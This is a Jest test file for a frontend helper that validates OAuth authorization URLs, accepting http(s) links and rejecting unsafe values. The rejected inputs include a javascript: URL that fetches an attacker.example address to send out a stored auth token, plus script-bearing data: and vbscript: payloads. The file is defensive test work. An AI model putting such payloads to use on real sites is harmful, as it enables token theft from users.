import { toSafeAuthorizationUrl } from '../../frontend/src/utils/oauthUrl';

describe('toSafeAuthorizationUrl', () => {
  it('accepts http(s) authorization URLs', () => {
    expect(toSafeAuthorizationUrl('https://idp.example.com/authorize?state=x')).toBe(
      'https://idp.example.com/authorize?state=x',
    );
    expect(toSafeAuthorizationUrl('http://localhost:8080/authorize')).toBe(
      'http://localhost:8080/authorize',
    );
  });

  it.each([
    "javascript:fetch('https://attacker.example/?t='+localStorage.getItem('mcphub_token'))",
    ' JavaScript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    '/relative/path',
    '',
    undefined,
    42,
  ])('rejects %p', (value) => {
    expect(toSafeAuthorizationUrl(value)).toBeUndefined();
  });
});
